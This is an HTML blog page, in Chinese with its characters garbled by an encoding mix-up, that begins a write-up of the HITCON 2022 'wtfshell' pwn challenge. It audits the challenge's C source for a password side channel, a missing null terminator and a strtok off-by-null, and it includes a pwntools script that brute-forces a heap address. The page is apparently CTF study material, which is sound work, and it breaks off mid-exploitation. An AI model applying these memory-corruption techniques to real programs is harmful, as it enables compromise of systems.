



<!DOCTYPE html>
<html lang="zh-CN">
<head>
  <meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
<meta name="theme-color" content="#FFF">
  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">

<link rel="icon" type="image/ico" sizes="32x32" href="/images/favicon.ico">
  <meta http-equiv="Cache-Control" content="no-transform">
  <meta http-equiv="Cache-Control" content="no-siteapp">


<link rel="alternate" type="application/rss+xml" title="æ¸…é¢¨å¾®é†º" href="https://www.wdqjxtmph.top/rss.xml" />
<link rel="alternate" type="application/atom+xml" title="æ¸…é¢¨å¾®é†º" href="https://www.wdqjxtmph.top/atom.xml" />
<link rel="alternate" type="application/json" title="æ¸…é¢¨å¾®é†º" href="https://www.wdqjxtmph.top/feed.json" />

<link rel="stylesheet" href="//fonts.googleapis.com/css?family=Mulish:300,300italic,400,400italic,700,700italic%7CFredericka%20the%20Great:300,300italic,400,400italic,700,700italic%7CNoto%20Serif%20JP:300,300italic,400,400italic,700,700italic%7CNoto%20Serif%20SC:300,300italic,400,400italic,700,700italic%7CInconsolata:300,300italic,400,400italic,700,700italic&display=swap&subset=latin,latin-ext">

<link rel="stylesheet" href="/css/app.css?v=0.2.5">

  
  <meta name="keywords" content="wp" />


<link rel="canonical" href="https://www.wdqjxtmph.top/2022/12/01/hitcon-wtfshell/">



  <title>
hitcon2022-wtfshell - CTFèµ›é¢˜å¤ç° |
LoÏ„Ï…s = æ¸…é¢¨å¾®é†º = å‡Œæ’</title>
<meta name="generator" content="Hexo 5.4.2"></head>
<body itemscope itemtype="http://schema.org/WebPage">
  <div id="loading">
    <div class="cat">
      <div class="body"></div>
      <div class="head">
        <div class="face"></div>
      </div>
      <div class="foot">
        <div class="tummy-end"></div>
        <div class="bottom"></div>
        <div class="legs left"></div>
        <div class="legs right"></div>
      </div>
      <div class="paw">
        <div class="hands left"></div>
        <div class="hands right"></div>
      </div>
    </div>
  </div>
  <div id="container">
    <header id="header" itemscope itemtype="http://schema.org/WPHeader">
      <div class="inner">
        <div id="brand">
          <div class="pjax">
          
  <h1 itemprop="name headline">hitcon2022-wtfshell
  </h1>
  
<div class="meta">
  <span class="item" title="åˆ›å»ºæ—¶é—´ï¼š2022-12-01 15:02:07">
    <span class="icon">
      <i class="ic i-calendar"></i>
    </span>
    <span class="text">å‘è¡¨äº</span>
    <time itemprop="dateCreated datePublished" datetime="2022-12-01T15:02:07+08:00">2022-12-01</time>
  </span>
  <span class="item" title="æœ¬æ–‡å­—æ•°">
    <span class="icon">
      <i class="ic i-pen"></i>
    </span>
    <span class="text">æœ¬æ–‡å­—æ•°</span>
    <span>34k</span>
    <span class="text">å­—</span>
  </span>
  <span class="item" title="é˜…è¯»æ—¶é•¿">
    <span class="icon">
      <i class="ic i-clock"></i>
    </span>
    <span class="text">é˜…è¯»æ—¶é•¿</span>
    <span>30 åˆ†é’Ÿ</span>
  </span>
</div>


          </div>
        </div>
        <nav id="nav">
  <div class="inner">
    <div class="toggle">
      <div class="lines" aria-label="åˆ‡æ¢å¯¼èˆªæ ">
        <span class="line"></span>
        <span class="line"></span>
        <span class="line"></span>
      </div>
    </div>
    <ul class="menu">
      <li class="item title"><a href="/" rel="start">LoÏ„Ï…s</a></li>
    </ul>
    <ul class="right">
      <li class="item theme">
        <i class="ic i-sun"></i>
      </li>
      <li class="item search">
        <i class="ic i-search"></i>
      </li>
    </ul>
  </div>
</nav>

      </div>
      <div id="imgs" class="pjax">
          <img src="https://pic.imgdb.cn/item/63c25091be43e0d30ef41a48.webp">
      </div>
    </header>
    <div id="waves">
      <svg class="waves" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" viewBox="0 24 150 28" preserveAspectRatio="none" shape-rendering="auto">
        <defs>
          <path id="gentle-wave" d="M-160 44c30 0 58-18 88-18s 58 18 88 18 58-18 88-18 58 18 88 18 v44h-352z" />
        </defs>
        <g class="parallax">
          <use xlink:href="#gentle-wave" x="48" y="0" />
          <use xlink:href="#gentle-wave" x="48" y="3" />
          <use xlink:href="#gentle-wave" x="48" y="5" />
          <use xlink:href="#gentle-wave" x="48" y="7" />
        </g>
      </svg>
    </div>
    <main>
      <div class="inner">
        <div id="main" class="pjax">
          
  <div class="article wrap">
    
<div class="breadcrumb" itemscope itemtype="https://schema.org/BreadcrumbList">
<i class="ic i-home"></i>
<span><a href="/">é¦–é¡µ</a></span><i class="ic i-angle-right"></i>
<span  class="current" itemprop="itemListElement" itemscope itemtype="https://schema.org/ListItem"><a href="/categories/CTF%E8%B5%9B%E9%A2%98%E5%A4%8D%E7%8E%B0/" itemprop="item" rel="index" title="åˆ†ç±»äº CTFèµ›é¢˜å¤ç°"><span itemprop="name">CTFèµ›é¢˜å¤ç°</span></a>
<meta itemprop="position" content="1" /></span>
</div>

    <article itemscope itemtype="http://schema.org/Article" class="post block" lang="zh-CN">
  <link itemprop="mainEntityOfPage" href="https://www.wdqjxtmph.top/2022/12/01/hitcon-wtfshell/">

  <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
    <meta itemprop="image" content="/images/avatar.jpg">
    <meta itemprop="name" content="LoÏ„Ï…s">
    <meta itemprop="description" content="å‡Œæ’, å‡Œæ’å±±å…¶è‹¥é™‹å…®ã€">
  </span>

  <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
    <meta itemprop="name" content="æ¸…é¢¨å¾®é†º">
  </span>

  <div class="body md" itemprop="articleBody">
    

    <p>é¦–å‘äºçœ‹é›ªï¼š</p>
<p><span class="exturl" data-url="aHR0cHM6Ly9iYnMua2FueHVlLmNvbS90aHJlYWQtMjc1Mzc2Lmh0bQ==">https://bbs.kanxue.com/thread-275376.htm</span></p>
<h1 id="å‰è¨€"><a class="markdownIt-Anchor" href="#å‰è¨€">#</a> å‰è¨€</h1>
<p>å’Œ r3kapig ä¸€èµ·å¾æˆ˜ hitcon2022ï¼Œpwn æ‰‹åå¤§ç‰¢ï¼Œwtfshell è¿™é“é¢˜å®¡äº†ä¸‰å°æ—¶æºç ï¼Œåªçœ‹å‡ºæ¥ä¸€ä¸ª  <code>chk_pw</code>  ä¾§ä¿¡é“ + <code>read_pw</code>  æœªç½®é›¶ï¼Œæœ€ç»ˆå¯ä»¥é€šè¿‡ä¾§ä¿¡é“ leak å‡ºä¸€ä¸ª heap åœ°å€ï¼Œæ²¡æœ‰çœ‹å‡ºå…¶ä½™çš„æ´ï¼Œæœ€ç»ˆæ”¾å¼ƒã€‚</p>
<p><code>wtfshell1</code>  æœ€ç»ˆè§£æ•°ä¸º 4ï¼Œ <code>wtfshell2</code>  æœ€ç»ˆè§£æ•°ä¸º 3ã€‚ç¬¬ä¸€é¢˜è§£å‡ºæ¥äº†ç¬¬äºŒé¢˜åŸºæœ¬å°±è§£å‡ºæ¥äº†ã€‚</p>
<p>æ„Ÿè°¢ <code>crazyman</code>  ç¬¬äºŒå¤©æ¥å‘Šè¯‰æˆ‘ wtfshell çš„ä¸»è¦æ¼æ´ï¼ˆstrtok off by nullï¼‰ï¼Œæ€è€ƒåè„‘å­é‡Œå‡ºç°äº†ä¸€å¥—å®Œæ•´çš„åˆ©ç”¨æ€è·¯ã€‚å› æ­¤åšå‡ºå¦‚ä¸‹å¤ç°ã€‚</p>
<p>æ–‡ç« ä¸å¤ªå–œæ¬¢é™„å›¾ï¼Œå¤§å®¶å¤šåŒ…æ¶µï¼Œåšå‡ºæ¥éš¾åº¦è¿˜æ˜¯è›®å¤§çš„ï¼Œå› ä¸ºå³ä½¿çŸ¥é“äº† <code>strtok-&gt;off-by-null</code> ï¼Œè¿˜æ˜¯æœ‰éå¸¸å¤šç»†èŠ‚éœ€è¦æ€è€ƒâ˜¹ï¸ã€‚</p>
<p>åº”è¯¥æ˜¯å…¨çƒé¦–å‘ wtfshell çš„ wp å§ğŸ˜ã€‚</p>
<h2 id="ä»£ç å®¡è®¡"><a class="markdownIt-Anchor" href="#ä»£ç å®¡è®¡">#</a> ä»£ç å®¡è®¡</h2>
<p>é¢˜ç›®æä¾›äº†æºç ï¼Œä¸€å…± 930 + è¡Œï¼Œlibc ä¸º <code>glibc2.36 3</code> ï¼Œç”±äº <code>glibc-all-in-one</code>  ä¸­æ‰¾ä¸åˆ°è¯¥ç‰ˆæœ¬ libcï¼Œå› æ­¤æˆ‘æ¢äº†ä¸€ä¸ªå°ç‰ˆæœ¬ï¼Œç”¨ <code>glibc2.36 4</code>  è¿›è¡Œå¤ç°ã€‚</p>
<h3 id="ç¨‹åºä¸»è¦é€»è¾‘"><a class="markdownIt-Anchor" href="#ç¨‹åºä¸»è¦é€»è¾‘">#</a> ç¨‹åºä¸»è¦é€»è¾‘</h3>
<p>ç¨‹åºå®ç°äº†ä¸€ä¸ªç±»ä¼¼äº shell äº¤äº’ï¼Œè¾“å…¥ <code>rtfm</code>  å¯ä»¥æŸ¥çœ‹èœå•ï¼š</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€</span><br><span class="line">Ï€	rtfm.			Read This Friendly Manual	Ï€</span><br><span class="line">Ï€	qq.			Quit Quietly			Ï€</span><br><span class="line">Ï€	lol,[-l].		List Of fiLes			Ï€</span><br><span class="line">Ï€	rip.[FILE]		Redirect InPut			Ï€</span><br><span class="line">Ï€	nsfw,FILE,PERM.		New Single File for Writing	Ï€</span><br><span class="line">Ï€	wtf,DATA,FILE.		Write data To File		Ï€</span><br><span class="line">Ï€	omfg,FILE.		Output My File Gracefully	Ï€</span><br><span class="line">Ï€	gtfo,FILE.		GeT the File Out		Ï€</span><br><span class="line">Ï€	ouo.			Output current User Out		Ï€</span><br><span class="line">Ï€	stfu,USER.		SeT new Friendly User		Ï€</span><br><span class="line">Ï€	asap,[USER].		ASsign A new Password		Ï€</span><br><span class="line">Ï€	sus,USER.		Switch USer			Ï€</span><br><span class="line">Ï€	shit.			SHell InformaTion		Ï€</span><br><span class="line">Ï€	irl.			Instantly Reset shelL		Ï€</span><br><span class="line">Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€</span><br></pre></td></tr></table></figure>
<p>åŠŸèƒ½ä¸»è¦ä¸ºï¼š</p>
<ul>
<li>lolï¼šå±•ç¤ºæ‰€æœ‰ files æ–‡ä»¶ï¼ŒåŠ ä¸Š <code>-l</code>  å‘½ä»¤å¯ä»¥æŸ¥çœ‹â‘ æ–‡ä»¶æ‰€å±ç”¨æˆ·ï¼Œâ‘¡æ–‡ä»¶ sizeï¼Œâ‘¢æ–‡ä»¶åã€‚</li>
<li>ripï¼šå‘æŒ‡å®šæ–‡ä»¶æœ«å°¾æ·»åŠ å†…å®¹ï¼Œé‡‡ç”¨ <code>realloc</code> + <code>strcat</code>  å®ç°ï¼Œå…¶ä¸­ <code>realloc_size</code>  ä¸º <code>data_size</code> +1, é˜²æ­¢ strcat æœ«å°¾ \x00 é€ æˆ off by nullã€‚</li>
<li>nsfwï¼šåˆ›å»ºæ–‡ä»¶ï¼Œå¹¶å®šåˆ¶å…¶æƒé™ï¼ˆrwï¼‰ã€‚</li>
<li>wtfï¼šé‡æ–°è¦†å†™æ–‡ä»¶å†…å®¹ï¼Œæœ€å¤§ size ä¸º 0x400ã€‚</li>
<li>omfgï¼šæ‰“å°æ–‡ä»¶å†…å®¹ï¼ˆè‹¥æ–‡ä»¶å…·æœ‰å¯è¯»å±æ€§ï¼‰ã€‚</li>
<li>gtfoï¼šåˆ é™¤æŒ‡å®šæ–‡ä»¶ã€‚</li>
<li>ouoï¼šæ‰“å°å½“å‰ç”¨æˆ·åã€‚</li>
<li>stfuï¼šæ·»åŠ æ–°ç”¨æˆ·ï¼Œå¯å®šä¹‰å…¶ nameã€‚</li>
<li>asapï¼šæ›´æ”¹æŒ‡å®šç”¨æˆ·å¯†ç ã€‚å…¶ä¸­è°ƒç”¨çš„å‡½æ•° <code>chk_pw</code>  å­˜åœ¨ <code>ä¾§ä¿¡é“</code> æ³„éœ²æ¼æ´ã€‚</li>
<li>susï¼šç™»å½•åå¯æ›´æ¢ç”¨æˆ·ã€‚</li>
<li>irlï¼šreset æ‰€æœ‰å†…å®¹ï¼šâ‘ æ¸…é™¤æ‰€æœ‰ç”¨æˆ·ç»“æ„ä½“ï¼Œâ‘¡æ¸…ç©ºæ‰€æœ‰ file ç»“æ„ä½“ï¼Œâ‘¢free å¹¶é‡æ–°ç”³è¯· gbuffã€‚</li>
<li>qqï¼šé€€å‡ºç¨‹åºå‰ free æ‰ gbuffï¼Œclose äº†æ‰€æœ‰æ–‡ä»¶æè¿°ç¬¦ï¼Œå¹¶ä¸”é‡‡ç”¨ <code>_exit</code>  é€€å‡ºã€‚</li>
</ul>
<h3 id="æ¼æ´ç‚¹"><a class="markdownIt-Anchor" href="#æ¼æ´ç‚¹">#</a> æ¼æ´ç‚¹</h3>
<h4 id="ä¾§ä¿¡é“"><a class="markdownIt-Anchor" href="#ä¾§ä¿¡é“">#</a> ä¾§ä¿¡é“</h4>
<p>æŸ¥çœ‹ <code>chk_pw</code>  å‡½æ•°ï¼š</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">chk_pw</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span> *pw)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">char</span> input;</span><br><span class="line">    <span class="keyword">int</span> pw_len = <span class="built_in">strlen</span>(pw);</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; pw_len + <span class="number">1</span>; i++) &#123;</span><br><span class="line">        <span class="keyword">int</span> res = read(STDIN_FILENO, &amp;input, <span class="number">1</span>); </span><br><span class="line">        <span class="keyword">if</span> (res &lt; <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="built_in">terminate</span>();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (i == pw_len) &#123; <span class="comment">// The last character must be a line break</span></span><br><span class="line">            <span class="keyword">return</span> input == <span class="string">&#x27;\n&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (input == <span class="string">&#x27;\n&#x27;</span>) &#123; <span class="comment">// Ignore accidental line breaks</span></span><br><span class="line">            i--;</span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">/* If password mismatch, quit immediately */</span></span><br><span class="line">        <span class="keyword">if</span> (input != pw[i]) &#123;</span><br><span class="line">            <span class="comment">/* Read characters until &#x27;\n&#x27; */</span></span><br><span class="line">            <span class="keyword">while</span> (<span class="number">1</span>) &#123;</span><br><span class="line">                <span class="keyword">int</span> res = read(STDIN_FILENO, &amp;input, <span class="number">1</span>); </span><br><span class="line">                <span class="keyword">if</span> (res &lt; <span class="number">0</span>) &#123;</span><br><span class="line">                    <span class="built_in">terminate</span>();</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">if</span> (input == <span class="string">&#x27;\n&#x27;</span>) &#123;</span><br><span class="line">                    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>å¯ä»¥çœ‹åˆ°é€»è¾‘ä¸ºï¼š</p>
<ul>
<li>é€å­—ç¬¦åˆ¤æ–­å¯†ç æ˜¯å¦æ­£ç¡®ï¼Œè‹¥ä¸æ­£ç¡®ï¼Œè¯»å–è¾“å…¥ç›´åˆ° \n åé€€å‡ºã€‚</li>
<li>è‹¥å­—ç¬¦æ­£ç¡®åˆ™å¾€åç»§ç»­æ£€æŸ¥ï¼Œé€”ä¸­è‹¥é‡åˆ° \nï¼Œç›´æ¥åˆ©ç”¨ <code>i--</code>  æ¥å¿½ç•¥</li>
</ul>
<p>å½“æ£€æŸ¥é€”ä¸­é‡åˆ°ä¸æ­£ç¡®çš„å­—ç¬¦ï¼Œä¸” i å¹¶æœªåˆ°è¾¾ <code>pw_len</code>  æ—¶ï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡è¾“å…¥ \n ç¬¦æ˜¯å¦é€€å‡º <code>chk_pw</code>  æ¥åˆ¤æ–­å½“å‰å¯†ç å­—ç¬¦æ˜¯å¦æ­£ç¡®ã€‚</p>
<p>ä¸”è‹¥å¯†ç ä¸æ­£ç¡®ï¼Œè¾“å…¥ \n é€€å‡º <code>chk_pw</code>  åä¼šæ‰“å°ï¼š</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (!chk_pw(gusers[i]-&gt;ushadow)) &#123;</span><br><span class="line">                <span class="comment">/* Clear data when error occurs */</span></span><br><span class="line">                bzero(gusers[i]-&gt;ushadow, PWMAX);</span><br><span class="line">                write_str(<span class="string">&quot;asap: pw1 â‰  pw2\n&quot;</span>);</span><br><span class="line">                <span class="keyword">return</span>;</span><br><span class="line">            &#125;</span><br></pre></td></tr></table></figure>
<p>å› æ­¤æˆ‘ä»¬å¯ä»¥é€šè¿‡æ¥æ”¶å­—ç¬¦æ¥åˆ¤æ–­å¯†ç å­—ç¬¦æ˜¯å¦æ­£ç¡®ï¼Œè¾¾åˆ°ä¾§ä¿¡é“çˆ†ç ´çš„ç›®çš„ã€‚</p>
<h4 id="userç»“æ„ä½“"><a class="markdownIt-Anchor" href="#userç»“æ„ä½“">#</a> user ç»“æ„ä½“</h4>
<p>æŸ¥çœ‹ user ç»“æ„ä½“ï¼šuname å †æŒ‡é’ˆè·Ÿåœ¨ ushadow å¯†ç åã€‚</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">user</span> &#123;</span></span><br><span class="line">    <span class="keyword">char</span> ushadow[PWMAX];</span><br><span class="line">    <span class="keyword">char</span> *uname;</span><br><span class="line">    <span class="keyword">int</span> uid;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p>æŸ¥çœ‹ <code>read_pw</code>  å‡½æ•°ï¼šåœ¨è¯»æ»¡ <code>PWMAX</code> size çš„æ—¶å€™ï¼Œå¹¶æœªåœ¨æœ«å°¾ç½®é›¶ï¼Œå¯¼è‡´ <code>user-&gt;ushadow</code>  ä¸ <code>user-&gt;uname</code>  æŒ‡é’ˆè¿æ¥ã€‚</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">read_pw</span><span class="params">(<span class="keyword">char</span> *dest)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> read_num = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span> (read_num &lt; PWMAX) &#123;</span><br><span class="line">        <span class="keyword">int</span> res = read(STDIN_FILENO, &amp;dest[read_num], <span class="number">1</span>);</span><br><span class="line">        <span class="keyword">if</span> (res &lt; <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="built_in">terminate</span>();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (dest[read_num] == <span class="string">&#x27;\n&#x27;</span>) &#123;</span><br><span class="line">            dest[read_num] = <span class="string">&#x27;\0&#x27;</span>;</span><br><span class="line">            <span class="keyword">return</span> read_num;</span><br><span class="line">        &#125;</span><br><span class="line">        read_num++;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> read_num;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>æŸ¥çœ‹ <code>chk_pw</code>  å‡½æ•°ï¼šåˆ¤æ–­å¯†ç ä½æ•°æ˜¯é€šè¿‡ <code>strlen</code>  æ¥åˆ¤æ–­çš„ï¼š</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> pw_len = <span class="built_in">strlen</span>(pw);</span><br></pre></td></tr></table></figure>
<p>å› æ­¤ç»“åˆèµ·æ¥ï¼Œæˆ‘ä»¬å¯ä»¥åˆ©ç”¨ä¾§ä¿¡é“ + ç»“æ„ä½“ï¼Œæ¥ leak å‡ºä¸€ä¸ªå †åœ°å€ã€‚</p>
<h4 id="strtok-off-by-null"><a class="markdownIt-Anchor" href="#strtok-off-by-null">#</a> strtok-&gt;off by null</h4>
<p>main å‡½æ•°ä¸­çš„ gbuff æ˜¯æ‹¿æ¥å‚¨å­˜æˆ‘ä»¬çš„å‘½ä»¤å­—ç¬¦ä¸²çš„ï¼Œå¤§å°ä¸º 0x400ï¼Œå¯¹å…¶æœ‰ä¸€ä¸ªåˆ†å‰²ç¬¦å¤„ç†ï¼š</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">read_max(gbuff, GBSIZE);</span><br><span class="line"><span class="keyword">char</span> *token = strtok(gbuff, delim);</span><br></pre></td></tr></table></figure>
<p><code>strtok</code>  å‡½æ•°ä¼šä¸æ–­å¾€å­—ç¬¦ä¸²åé¢éå†ï¼Œç›´åˆ°é‡åˆ° <code>\x00</code>  æˆªæ–­ï¼ŒåŒæ—¶ <code>strtok</code>  ä¼šå°†æŸ¥æ‰¾åˆ°çš„éš”æ–­ç¬¦ <code>delim</code>  è®¾ç½®ä¸º <code>\x00</code> ã€‚</p>
<p>æŸ¥çœ‹éš”æ–­ç¬¦ delimï¼š</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> <span class="keyword">char</span> delim[] = <span class="string">&quot;.,?!&quot;</span>;</span><br></pre></td></tr></table></figure>
<p>å…¶ä¸­ï¼çš„ ascii ç å€¼ä¸º 0x21ï¼Œè‹¥æˆ‘ä»¬èƒ½åœ¨ <code>gbuff</code>  0x400 å¤§å°çš„å †å—é‡Œå¡«å…¥ 0x408 ä¸ªéé›¶å­—ç¬¦ï¼ŒåŒæ—¶åœ¨åé¢è·Ÿä¸Šä¸€ä¸ª size å¤´ä½å­—èŠ‚ä¸º 0x21 çš„å †å—ï¼Œå³å¯é€šè¿‡ <code>strtok</code>  å®ç° <code>off-by-null</code> ã€‚</p>
<h2 id="wtfshell1"><a class="markdownIt-Anchor" href="#wtfshell1">#</a> wtfshell1</h2>
<h3 id="æ³„éœ²å †åœ°å€"><a class="markdownIt-Anchor" href="#æ³„éœ²å †åœ°å€">#</a> æ³„éœ²å †åœ°å€</h3>
<p>é¦–å…ˆç”³è¯·ä¸€ä¸ª <code>user</code>  ç»“æ„ä½“ï¼Œå¡«æ»¡å…¶ pwdã€‚æœ¬åœ° gdb è°ƒè¯•ä¹‹åå‘ç°è¿™æ · <code>user-&gt;uname</code>  æŒ‡é’ˆæœ«å°¾ä¸º 0ï¼Œå› æ­¤å¯ä»¥ç”³è¯·ä¸¤ä¸ª <code>user</code>  ç»“æ„ä½“ï¼Œç¬¬ä¸€ä¸ªç”¨ä½œå¡«å……ï¼Œä½¿ç¬¬äºŒä¸ª <code>user</code>  ç»“æ„ä½“çš„ <code>user-&gt;uname</code>  æŒ‡é’ˆæœ«å°¾ä¸ä¸º 0ã€‚</p>
<p>ç”±äºå †åœ°å€æœ€ä½å­—èŠ‚å›ºå®šï¼Œä¸ç”¨æ³„éœ²ï¼š</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">burp</span>(<span class="params">name,pwd</span>):</span></span><br><span class="line">    addr = <span class="string">&quot;\x80&quot;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0x6</span>):</span><br><span class="line">        log.success(<span class="string">&quot;addr: &quot;</span>+<span class="built_in">hex</span>(u64(addr.ljust(<span class="number">0x8</span>,<span class="string">&#x27;\0&#x27;</span>))))</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0xb</span>,<span class="number">0xff</span>):</span><br><span class="line">            payload = <span class="string">b&#x27;asap,&#x27;</span>+name</span><br><span class="line">            menu(payload)</span><br><span class="line">            r.recvuntil(<span class="string">b&quot;password:&quot;</span>)</span><br><span class="line">            r.send(pwd)</span><br><span class="line">            r.recvuntil(<span class="string">b&quot;retype password:&quot;</span>)</span><br><span class="line">            r.send(pwd+addr+<span class="built_in">chr</span>(j)+<span class="string">&quot;\n&quot;</span>)</span><br><span class="line">            data=r.recvuntil(<span class="string">&quot;\n&quot;</span>,timeout=<span class="number">0.1</span>)</span><br><span class="line">            <span class="keyword">if</span> <span class="string">b&quot;asap: &quot;</span> <span class="keyword">not</span> <span class="keyword">in</span> data:</span><br><span class="line">                addr+=<span class="built_in">chr</span>(j)</span><br><span class="line">                r.send(<span class="string">b&#x27;\x00\n&#x27;</span>)</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> u64(addr.ljust(<span class="number">0x8</span>,<span class="string">&#x27;\0&#x27;</span>))</span><br></pre></td></tr></table></figure>
<h3 id="æ„é€ off-by-null"><a class="markdownIt-Anchor" href="#æ„é€ off-by-null">#</a> æ„é€  off-by-null</h3>
<p>å †é£æ°´çœŸçš„ç»™ğŸ‘´æ•´éº»äº†ã€‚ğŸ˜­ğŸ˜­ğŸ˜­ğŸ˜­ğŸ˜­</p>
<h4 id="å¾—åˆ°ä¸€ä¸ªå¡«æ»¡çš„gbuffå †å—"><a class="markdownIt-Anchor" href="#å¾—åˆ°ä¸€ä¸ªå¡«æ»¡çš„gbuffå †å—">#</a> å¾—åˆ°ä¸€ä¸ªå¡«æ»¡çš„ gbuff å †å—</h4>
<p>é¦–å…ˆæˆ‘ä»¬éœ€è¦å¾—åˆ°ä¸€ä¸ªè¢«å¡«æ»¡ 0x408 éé›¶å­—èŠ‚çš„ <code>gbuff</code>  å †å—ã€‚</p>
<p>æ•´ä¸ªç¨‹åº free åªèƒ½é€šè¿‡ä¸¤ç§æ–¹å¼ï¼šâ‘ xreallocï¼Œâ‘¡xfreeã€‚</p>
<p>å…¶ä¸­ xfree å‡½æ•°ï¼š</p>
